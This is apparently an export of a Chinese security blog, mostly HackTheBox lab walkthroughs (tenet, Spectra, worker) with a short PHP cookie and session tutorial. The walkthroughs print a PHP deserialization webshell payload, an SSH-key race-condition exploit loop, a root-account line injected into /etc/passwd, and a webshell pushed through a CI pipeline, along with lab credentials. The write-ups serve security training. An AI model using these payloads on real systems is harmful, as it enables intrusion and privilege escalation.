<p><img src="/images/nineveh/18.jpg" alt="18"></p>
<p>最后获取root</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:tenet</title>
    <url>/2021/01/17/HTB-tenet/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>添加host</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.129.34.56  tenet.htb</span><br></pre></td></tr></table></figure>

<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/images/tenet/1.png" alt="1"></p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>目录枚举发现了wordpress，但之后没有什么有意思的信息</p>
<p>在留言板处得到了提示</p>
<p><img src="/images/tenet/2.png" alt="2"></p>
<p>提示了存在备份文件，sator.php</p>
<p>尝试访问<code>http://tenet.htb/sator.php</code>或者<code>http://tenet.htb/sator.php.bak</code>但都不存在</p>
<p>稍微卡了一会儿后，我尝试不携带host直接ip访问</p>
<p><code>http://10.129.34.56/sator.php</code></p>
<p><img src="/images/tenet/3.png" alt="3"></p>
<p><code>10.129.34.56/sator.php.bak</code></p>
<p><img src="/images/tenet/4.png" alt="4"></p>
<p>发现了备份文件，源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DatabaseExport</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $user_file = <span class="string">&#x27;users.txt&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> $data = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_db</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;[+] Grabbing users from text file &lt;br&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt; data = <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		file_put_contents(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> . <span class="keyword">$this</span> -&gt;user_file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;[] Database updated &lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="comment">//	echo &#x27;Gotta get this working properly...&#x27;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$input = $_GET[<span class="string">&#x27;arepo&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$databaseupdate = unserialize($input);</span><br><span class="line"></span><br><span class="line">$app = <span class="keyword">new</span> DatabaseExport;</span><br><span class="line">$app -&gt; update_db();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>这里只要得到了源码，就非常好办了，一眼就能看出是一个php反序列化漏洞，代码的危害是会造成任意文件上传，这里的反序列化漏洞比较基础</p>
<p>我们可以直接构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class DatabaseExport</span><br><span class="line">&#123;</span><br><span class="line">    public $user_file&#x3D;&#39;shell.php&#39;;</span><br><span class="line">    public $data&#x3D;&quot;&lt;?php phpinfo();system(\$_GET[&#39;cmd&#39;]); ?&gt;&quot;;		&#x2F;&#x2F;最好外部用&quot;，内部用&#39;</span><br><span class="line">&#125;</span><br><span class="line">$payload&#x3D;new DatabaseExport;</span><br><span class="line">echo serialize($payload);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/tenet/5.png" alt="5"></p>
<p>最后去源代码里查看，就可以得到payload了</p>
<p>根据泄露的代码，获取提交参数，然后去提交，这里序列化代码不需要url编码也行</p>
<p>payload:<code>10.129.34.56/sator.php?arepo=O:14:&quot;DatabaseExport&quot;:2:&#123;s:9:&quot;user_file&quot;;s:9:&quot;shell.php&quot;;s:4:&quot;data&quot;;s:40:&quot;&lt;?php phpinfo();system($_GET[&#39;cmd&#39;]); ?&gt;&quot;;&#125;</code></p>
<p><img src="/images/tenet/6.png" alt="6"></p>
<p>看来文件上传成功了</p>
<p><img src="/images/tenet/7.png" alt="7"></p>
<p>成功解析，然后就可以得到初始的shell了</p>
<p><img src="/images/tenet/8.png" alt="8"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>读取wordpress的wp-config.php获取mysql连接密码</p>
<p><img src="/images/tenet/9.png" alt="9"></p>
<p>发现了<code>neil/Opera2112</code></p>
<p>主机当中确实存在neil用户，尝试密码复用，直接切换到他，成功获取user权限</p>
<p><img src="/images/tenet/10.png" alt="10"></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>发现可以sudo运行的shell脚本</p>
<p><img src="/images/tenet/11.png" alt="11"></p>
<p>内容如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">checkAdded() &#123;</span><br><span class="line"></span><br><span class="line">sshName=$(/bin/echo $key | /usr/bin/cut -d &quot; &quot; -f 3)</span><br><span class="line"></span><br><span class="line">if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then</span><br><span class="line"></span><br><span class="line">        /bin/echo &quot;Successfully added $sshName to authorized_keys file!&quot;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">        /bin/echo &quot;Error in adding $sshName to authorized_keys file!&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">checkFile() &#123;</span><br><span class="line"></span><br><span class="line">if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then</span><br><span class="line"></span><br><span class="line">        /bin/echo &quot;Error in creating key file!&quot;</span><br><span class="line"></span><br><span class="line">        if [[ -f $1 ]]; then /bin/rm $1; fi</span><br><span class="line"></span><br><span class="line">        exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addKey() &#123;</span><br><span class="line"></span><br><span class="line">tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)</span><br><span class="line"></span><br><span class="line">(umask 110; touch $tmpName)</span><br><span class="line"></span><br><span class="line">/bin/echo $key &gt;&gt;$tmpName</span><br><span class="line"></span><br><span class="line">checkFile $tmpName</span><br><span class="line"></span><br><span class="line">/bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">/bin/rm $tmpName</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key=&quot;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&quot;</span><br><span class="line">addKey</span><br><span class="line">checkAdded</span><br></pre></td></tr></table></figure>

<p>执行这个脚本，会将root的公钥写入类似这样的文件名<code>/tmp/ssh-keg6vGnD，/tmp/ssh-qZqnZ71z，/tmp/ssh-wiiBg6iw</code>的临时文件中，之后会将上一步临时文件里的公钥提取出来，追加到<code>/root/.ssh/authorized_keys</code>，最后删除临时文件</p>
<p>这里<strong>创建临时文件并将公钥写入</strong>到<strong>读取临时文件里的公钥写入authorized_keys</strong>中间有一系列if判断，存在时间差，存在条件竞争race condition，利用这点，我们可以将自己的公钥写入到root的authorized_keys中</p>
<p>现在本地生成密钥对</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>将自己的公钥写入到目标机器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTH8WyZ4QrzjoYZI56Tf7Vr2Hmejz24L2hzCELhrLIN5qCumZcpdfiBuKKgKMX&#x2F;xstZ4tBomYHdANP+iq&#x2F;gZZ1A8zo0s+AlLgh3s12PsjwOobe0ARest&#x2F;K7p5+P1qFWOzXKnDGjeV+QbBlAk8m87yhkEm0jEDLlBwF3Yh9yFucMoTiWDk7xjDp5lq+Hj8Db+OSx5DMSJnqLdaYxLMWxZeWzfyAM+iZByqWlpzJ5H4KwMgs393YGxrc4r+7TO68jk3QyPp&#x2F;IOGWa2XTYxCUl4ipvHKUgVrAsDuI22ABrLkGu0GejEvhDlg1gBAaDlt4ye5CH1TsSEz6SV+tlbMznqw3bwvcuT1qfNcRMWxvhF9Ued8ceSDonElkRUfOedmw5c8rAHTNhhMHK0PHQMuq0Ht8PxJ7aQlt&#x2F;ztPgSlk0dEyB+Vy74udIyevhBPRQNSPXAc39dGxnTlT30r2bFNOskSQ+V3ws34lcD6HEZ1967vRwxDK5NXOTXuHmnYgfSBOLGk&#x3D; root@kali&quot; &gt; &#x2F;home&#x2F;neil&#x2F;key</span><br></pre></td></tr></table></figure>

<p>之后建立两个ssh连接，在第一个ssh连接中，运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for ((i&#x3D;0;i&lt;2;)) ;do cat &#x2F;home&#x2F;neil&#x2F;key |tee &#x2F;tmp&#x2F;ssh-* ;done</span><br></pre></td></tr></table></figure>

<p>不断的将密钥写入到<code>ssh-*</code>这种格式的文件中</p>
<p>第二个ssh中，sudo运行该脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while true;do sudo &#x2F;usr&#x2F;local&#x2F;bin&#x2F;enableSSH.sh;done</span><br></pre></td></tr></table></figure>

<p>有个坑，用tee配合管道进行通配符写入会好一些，重定向和通配符好像会造成歧义重定向</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">neil@tenet:&#x2F;tmp$ cat &#x2F;home&#x2F;neil&#x2F;key &gt; &#x2F;tmp&#x2F;ssh-*</span><br><span class="line">-bash: &#x2F;tmp&#x2F;ssh-*: ambiguous redirect</span><br></pre></td></tr></table></figure>

<p>等待一段时间，就可以直接登录root了</p>
<p><img src="/images/tenet/12.png" alt="12"></p>
<p>最后看看竞争的文件，发现只写了几十个，就完成了提权</p>
<p><img src="/images/tenet/13.png" alt="13"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Spectra</title>
    <url>/2021/02/28/HTB-Spectra/</url>
    <content><![CDATA[<p><img src="/images/Spectra/16.png" alt="16"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>添加host</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.129.82.11    spectra.htb</span><br></pre></td></tr></table></figure>

<p><img src="/images/Spectra/1.png" alt="1"></p>
<p>web目录枚举</p>
<p><img src="/images/Spectra/2.png" alt="2"></p>
<p>发现main是一个wordpress应用，testing疑似测试目录</p>
<p>testing存在目录遍历</p>
<p><img src="/images/Spectra/3.png" alt="3"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>wp-config是wordpress保存数据库连接的文件，里面很轻松的找到了凭据</p>
<p><code>devtest/devteam01</code></p>
<p><img src="/images/Spectra/4.png" alt="4"></p>
<p>现在去main目录尝试登录wordpress，不过出现了错误</p>
<p><img src="/images/Spectra/5.png" alt="5"></p>
<p>考虑了站点情况，我是用wpscan对站点进行了扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token ****** --url http:&#x2F;&#x2F;spectra.htb&#x2F;main&#x2F; --enumerate u </span><br></pre></td></tr></table></figure>

<p>发现了Administrator用户</p>
<p><img src="/images/Spectra/6.png" alt="6"></p>
<p>所以当我尝试<code>Administrator/devteam01</code>，成功登录</p>
<p><img src="/images/Spectra/7.png" alt="7"></p>
<p>wordpress管理员获取shell方法已经做了很多，多种方法可以参考靶场Mr-Robot-1</p>
<p>这里就直接msf了</p>
<p><img src="/images/Spectra/8.png" alt="8"></p>
<p>成功获取shell</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>当我进去之后，还是有点意思，检查了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">cat &#x2F;etc&#x2F;*-release</span><br><span class="line">uname -a</span><br><span class="line">cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;osrelease</span><br></pre></td></tr></table></figure>

<p>好像是chrome os</p>
<p>有python可以得到pty</p>
<p><img src="/images/Spectra/9.png" alt="9"></p>
<p>不知道为什么，无法运行shell脚本，只能手动枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;bin&#x2F;sh .&#x2F;test.sh</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: Refusing to exec .&#x2F;test.sh from noexec mount; see https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromiumos&#x2F;docs&#x2F;+&#x2F;master&#x2F;security&#x2F;noexec_shell_scripts.md</span><br></pre></td></tr></table></figure>

<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>手动枚举发现了/opt/autologin.conf.orig</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span><br><span class="line"># Use of this source code is governed by a BSD-style license that can be</span><br><span class="line"># found in the LICENSE file.</span><br><span class="line">description   &quot;Automatic login at boot&quot;</span><br><span class="line">author        &quot;chromium-os-dev@chromium.org&quot;</span><br><span class="line"># After boot-complete starts, the login prompt is visible and is accepting</span><br><span class="line"># input.</span><br><span class="line">start on started boot-complete</span><br><span class="line">script</span><br><span class="line">  passwd&#x3D;</span><br><span class="line">  # Read password from file. The file may optionally end with a newline.</span><br><span class="line">  for dir in &#x2F;mnt&#x2F;stateful_partition&#x2F;etc&#x2F;autologin &#x2F;etc&#x2F;autologin; do</span><br><span class="line">    if [ -e &quot;$&#123;dir&#125;&#x2F;passwd&quot; ]; then</span><br><span class="line">      passwd&#x3D;&quot;$(cat &quot;$&#123;dir&#125;&#x2F;passwd&quot;)&quot;</span><br><span class="line">      break</span><br><span class="line">    fi</span><br><span class="line">  done</span><br><span class="line">  if [ -z &quot;$&#123;passwd&#125;&quot; ]; then</span><br><span class="line">    exit 0</span><br><span class="line">  fi</span><br><span class="line">  # Inject keys into the login prompt.</span><br><span class="line">  #</span><br><span class="line">  # For this to work, you must have already created an account on the device.</span><br><span class="line">  # Otherwise, no login prompt appears at boot and the injected keys do the</span><br><span class="line">  # wrong thing.</span><br><span class="line">  &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;inject-keys.py -s &quot;$&#123;passwd&#125;&quot; -k enter</span><br></pre></td></tr></table></figure>

<p>发现了凭据保存位置/etc/autologin/</p>
<p><img src="/images/Spectra/10.png" alt="10"></p>
<p>所以登录凭据为SummerHereWeCome!!</p>
<p>检查/etc/passwd，发现用户katie</p>
<p><img src="/images/Spectra/11.png" alt="11"></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p><img src="/images/Spectra/12.png" alt="12"></p>
<p><a href="https://linux.die.net/man/8/initctl">https://linux.die.net/man/8/initctl</a></p>
<p><a href="http://upstart.ubuntu.com/getting-started.html">http://upstart.ubuntu.com/getting-started.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -writable</span><br></pre></td></tr></table></figure>

<p><img src="/images/Spectra/13.png" alt="13"></p>
<p>我用ping命令尝试命令注入是否成功执行，在确认执行之后</p>
<p>我将<code>suser:$1$000$WGcjZIfxKhymgsHNCg2FQ.:0:0::/root:/bin/bash</code>注入到了/etc/passwd</p>
<p><img src="/images/Spectra/14.png" alt="14"></p>
<p>最后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh suser@spectra.htb</span><br><span class="line">toor</span><br></pre></td></tr></table></figure>

<p><img src="/images/Spectra/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>cookie和session</title>
    <url>/2019/11/08/cookie%E5%92%8Csession/</url>
    <content><![CDATA[<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>用户用浏览器访问时，Cookie以 <code>Key/Value</code>的形式作为用户标识</p>
<a id="more"></a>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">setcookie(name,value,expire,path,domain,secure,httponly);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>name:cookie的名称。服务器用来发出请求的cookie的名字</p>
</li>
<li><p>value:cookie的内容</p>
</li>
<li><p>expire:可选。cookie截至日期的Unix时间戳。通常使用time()加上或减去一定秒数。默认当浏览器关闭时，cookie就会到期</p>
</li>
<li><p>path:可选。服务器上cookie的路径，如果是/，cookie可以覆盖整个域，如果是一个子目录，cookie只在该目录中有效。默认值为当前cookie正被设置的当前目录。</p>
</li>
<li><p>domain:可选。cookie的互联网域名，如果是a.com，cookie对所有a.com和它的子域可用，如b.a.com<br>如果是c.b.com。cookie对c.b.com和它的子域可用，对b.com不可用。</p>
</li>
<li><p>secure:可选项。cookie是否必须通过https连接。如果值为TRUE，cookie只能在安全连接上传递。默认FALSE</p>
</li>
<li><p>httponly:可选项。(PHP5.2.0版本后实现的功能)。cookie是否必须使用HTTP协议。如果值为TRUE，脚本语言如Javascript无法访问cookie。默认值为FALSE</p>
</li>
</ul>
<h2 id="操作cookie"><a href="#操作cookie" class="headerlink" title="操作cookie"></a>操作cookie</h2><h3 id="设置cookie"><a href="#设置cookie" class="headerlink" title="设置cookie"></a>设置cookie</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">setcookie(<span class="string">&#x27;username&#x27;</span>,uniqid(),time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>,<span class="string">&#x27;/&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="读取cookie"><a href="#读取cookie" class="headerlink" title="读取cookie"></a>读取cookie</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;username&#x27;</span>])) $username=$_COOKIE[<span class="string">&#x27;username&#x27;</span>];</span><br></pre></td></tr></table></figure>

<h3 id="删除cookie"><a href="#删除cookie" class="headerlink" title="删除cookie"></a>删除cookie</h3><p>删除cookie除了时间戳以外其他所有参数必须和第一次发送cookie时的参数一致，否则删除失败</p>
<p>为了防止客户日期和时间设置错误，这个例子我设置了1个月的cookie过期时间</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">setcookie(<span class="string">&#x27;username&#x27;</span>,uniqid(),time()<span class="number">-2592000</span>,<span class="string">&#x27;/&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>Cookie的分类</p>
<ul>
<li>会话级别Cookie：所谓会话级别Cookie，就是在浏览器关闭之后Cookie就会失效。</li>
<li>持久级别Cookie：保存在硬盘的Cookie，只要设置了过期时间就是硬盘级别Cookie。</li>
</ul>
<h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>Cookie是有大小限制和数量限制的，并且越来越多的Cookie代表客户端和服务器的传输量增加<br>Session则解决了这个问题，每次只传一个唯一ID( <strong>Session是基于Cookie来工作的</strong> ) ，通过这个ID在服务器上查找用户信息。</p>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>每次我们访问一个页面，如果有开启session，也就是有session_start() 时，就会自动生成一个session_id 来标注是这次会话的唯一ID，生成一个<code>sess_seesion_id</code>文件（通常在/tmp）。当有写入$SESSION的时候，就会往这个文件里序列化写入数据，同时也会自动往cookie里写入一个名字为PHPSESSID的变量， 它的值正为session_id 。由于默认生成的这个PHPSESSID cookie是会话，也就是说关闭浏览器就会过期掉，所以，下次重新浏览时，会重新生成一个session_id，并生成一个新文件。</p>
<h3 id="session的销毁"><a href="#session的销毁" class="headerlink" title="session的销毁"></a><strong>session的销毁</strong></h3><p>这里有一个误区，session的生命周期不是随着浏览器打开就创建，浏览器关闭就销毁。session的声明周期是从创建到超时过期。也就是说，当session创建后，浏览器关闭，会话级别的Cookie被销毁，如果没有超过设定时间，该SessionID对应的session是没有被销毁的<br>销毁session的方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unset( $_SESSION[&#39;user&#39;])；&#x2F;&#x2F;销毁单个会话</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_SESSION &#x3D; array();</span><br><span class="line">session_destroy()；&#x2F;&#x2F;销毁多个会话</span><br></pre></td></tr></table></figure>

<p>设置超时</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> ini_get(<span class="string">&#x27;session.gc_maxlifetime&#x27;</span>);		<span class="comment">//显示超时周期</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.gc_maxlifetime&#x27;</span>,<span class="number">60</span>*<span class="number">24</span>*<span class="number">24</span>); <span class="comment">//修改超时时间为1天</span></span><br></pre></td></tr></table></figure>

<h3 id="会话安全"><a href="#会话安全" class="headerlink" title="会话安全"></a>会话安全</h3><p>最好使用https<br>其次进行多重校验，如检测ip，检测UA</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_SESSION[<span class="string">&#x27;ip&#x27;</span>]=$_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]</span><br><span class="line">$_SESSION[<span class="string">&#x27;UA&#x27;</span>]=$_SERVER[<span class="string">&quot;HTTP_USER_AGENT&quot;</span>]</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;ip&#x27;</span>] != $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>] <span class="keyword">or</span></span><br><span class="line">   $_SESSION[<span class="string">&#x27;UA&#x27;</span>] != $_SERVER[<span class="string">&quot;HTTP_USER_AGENT&quot;</span>]) diffenrent_user();</span><br></pre></td></tr></table></figure>

<p>最好different_user处不要做过多处理 ，直接删除当前对话，要求重新登录</p>
<h1 id="二者的异同"><a href="#二者的异同" class="headerlink" title="二者的异同"></a><strong>二者的异同</strong></h1><p>相同点(有关系的地方)：</p>
<ul>
<li>Session和Cookie都是为了让http协议又状态而存在</li>
<li>Session通过Cookie工作，Cookie传输的SessionID让Session知道这个客户端到底是谁</li>
</ul>
<p>不同点：</p>
<ul>
<li>Session将信息保存到服务器，Cookie将信息保存在客户端</li>
<li> Cookie存储的数据在不同的浏览器会有不同的限制，一般在同一个域名下，Cookie变量数量控制在20个以内，每个cookie值的大小控制在4kb以内。session值没有大小和数量限制，但如果数量过多，会增大服务器的压力 </li>
<li> cookie保存的内容是字符串，而服务器中的session保存的数据是对象</li>
</ul>
]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
  </entry>
  <entry>
    <title>HTB:worker</title>
    <url>/2021/02/02/HTB-worker/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/images/worker/1.png" alt="1"></p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>80端口web页面没有什么发现 </p>
<p>svn服务存在未授权访问，可以对它枚举，但我没接触过这个服务，找到了相关的cheat sheet</p>
<p><a href="https://www.perforce.com/blog/vcs/svn-commands-cheat-sheet">https://www.perforce.com/blog/vcs/svn-commands-cheat-sheet</a></p>
<p><a href="https://blog.csdn.net/gsg8709/article/details/79435741">https://blog.csdn.net/gsg8709/article/details/79435741</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">svn ls svn:&#x2F;&#x2F;10.10.10.203			#查看仓库下的文件名</span><br><span class="line">svn log svn:&#x2F;&#x2F;10.10.10.203			#查看日志</span><br><span class="line">svn checkout svn:&#x2F;&#x2F;10.10.10.203		#下载仓库文件</span><br></pre></td></tr></table></figure>

<p>其中的文件有</p>
<p><img src="/images/worker/2.png" alt="2"></p>
<p>大致是说该仓库不再维护，最新版本放在了<a href="http://devops.worker.htb/">http://devops.worker.htb</a></p>
<p>把主机名添加到hosts里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.203	devops.worker.htb dimension.worker.htb worker.htb</span><br></pre></td></tr></table></figure>

<p>访问发现需要凭据</p>
<p><img src="/images/worker/3.png" alt="3"></p>
<p>尝试访问另一个发现的地址<code>dimension.worker.htb</code></p>
<p><img src="/images/worker/4.png" alt="4"></p>
<p>其中work页面又有去多指向别的主机名的地址</p>
<p><img src="/images/worker/5.png" alt="5"></p>
<p>把它抓取下来，放到hosts里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;dimension.worker.htb&#x2F;\#work -s|grep -o &quot;http:&#x2F;&#x2F;.*htb&quot; |awk -F &quot;&#x2F;&#x2F;&quot; &#39;&#123;print $2&#125;&#39;</span><br><span class="line">curl -s 安静模式，关闭进度条</span><br><span class="line">grep -o 只显示匹配部分</span><br></pre></td></tr></table></figure>

<p>hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.203	devops.worker.htb dimension.worker.htb worker.htb alpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb</span><br></pre></td></tr></table></figure>

<p>之后页面是能访问了，但全部都是坑，不过好在靶机环境，大部分都是死链，不会陷的太久</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>回到开始，在svn log枚举处，发现了其他仓库</p>
<p><img src="/images/worker/6.png" alt="6"></p>
<p>这里必须进入之前checkout下载文件的目录，进行update跟新操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">svn update -r 2</span><br></pre></td></tr></table></figure>

<p><img src="/images/worker/7.png" alt="7"></p>
<p>发现了其他文件</p>
<p>在powershell脚本中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user &#x3D; &quot;nathen&quot; </span><br><span class="line">$plain &#x3D; &quot;wendel98&quot;</span><br><span class="line">$pwd &#x3D; ($plain | ConvertTo-SecureString)</span><br><span class="line">$Credential &#x3D; New-Object System.Management.Automation.PSCredential $user, $pwd</span><br><span class="line">$args &#x3D; &quot;Copy-Site.ps1&quot;</span><br><span class="line">Start-Process powershell.exe -Credential $Credential -ArgumentList (&quot;-file $args&quot;)</span><br></pre></td></tr></table></figure>

<p>发现了凭据<code>nathen/wendel98</code>。检查其他的仓库，没有有价值的发现</p>
<p>在拥有凭据后，尝试登录之前需要凭据的页面，发现运行着Azure Devops</p>
<p><img src="/images/worker/8.png" alt="8"></p>
<p>而且似乎正在部署一个web项目到w盘，也许可以利用这点上传webshell</p>
<p><img src="/images/worker/9.png" alt="9"></p>
<p>将该项目clone到本地</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone http:&#x2F;&#x2F;devops.worker.htb&#x2F;ekenas&#x2F;SmartHotel360&#x2F;_git&#x2F;spectral</span><br></pre></td></tr></table></figure>

<p>将webshell放入这里，由于IIS中间级，所以放入aspx或asp shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;test&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<p>master分支不可以直接push，这个问题是可预期的</p>
<p><img src="/images/worker/10.png" alt="10"></p>
<p>建一个evil分支推上去试试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b evil</span><br><span class="line">git push -u origin evil</span><br></pre></td></tr></table></figure>

<p><img src="/images/worker/11.png" alt="11"></p>
<p>之后可以去页面上查看到evil分支，确定push成功</p>
<p><img src="/images/worker/12.png" alt="12"></p>
<p>之后我们就可以创建pull request，进行修改。<br>之后别忘了<code>Approve</code>和<code>Complete</code>就行，这样webshell就应该被部署了到网站上了</p>
<p><img src="/images/worker/13.png" alt="13"></p>
<p>访问webshell</p>
<p><img src="/images/worker/14.png" alt="14"></p>
<p>之后反弹到本地</p>
